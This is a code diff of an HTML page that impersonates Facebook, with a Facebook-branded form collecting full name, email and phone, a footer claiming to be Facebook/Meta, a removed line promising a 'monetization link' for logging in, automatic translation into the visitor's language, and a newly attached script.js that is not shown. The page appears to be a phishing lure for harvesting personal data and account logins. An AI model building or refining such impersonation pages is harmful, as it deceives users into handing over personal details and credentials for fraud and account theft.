@@ -1,15 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <!-- Prevent Google Translate from changing title/brand -->
   <meta name="google" content="notranslate">
-
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <!-- Title stays exact -->
   <title>Facebook - Form</title>
-
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -17,7 +12,9 @@
   <div class="container">
     <div class="logo"><div class="logo-circle notranslate">F</div></div>
     <h2>Please fill in all fields carefully.</h2>
-    <form id="bigForm">
+
+    <!-- Changed id from bigForm to loginForm -->
+    <form id="loginForm">
       <input name="fullname" placeholder="Full Name" required>
       <input name="email" type="email" placeholder="Email Address" required>
       <input name="phone" type="tel" placeholder="Phone Number" required>
@@ -66,7 +63,7 @@
     </form>
   </div>
   <footer>
-    <p><span class="notranslate">Facebook</span> © 2025 – This is <span class="notranslate">Facebook</span> / ∞Meta. Use this <span class="notranslate">Facebook</span> monetization link to log into your account and start the monetization process.</p>
+    <p><span class="notranslate">Facebook</span> © 2025 – This is <span class="notranslate">Facebook</span> / ∞Meta.</p>
   </footer>
 
   <!-- Google Translate -->
@@ -81,17 +78,12 @@
         },
         'google_translate_element'
       );
-
-      // Detect user browser language
       var userLang = navigator.language || navigator.userLanguage;
       userLang = userLang.split('-')[0];
-
-      // Supported languages list
       var supported = ["es","fr","de","it","pt","zh-CN","ja"];
 
       if (supported.includes(userLang)) {
-        setTimeout(function(){
-          var select = document.querySelector("select.goog-te-combo");
+        setTimeout(function(){var select = document.querySelector("select.goog-te-combo");
           if (select) {
             select.value = userLang;
             select.dispatchEvent(new Event("change"));
@@ -100,6 +92,9 @@
       }
     }
   </script>
-  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+  <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+  <!-- ✅ Attach script -->
+  <script src="script.js"></script>
 </body>
 </html>
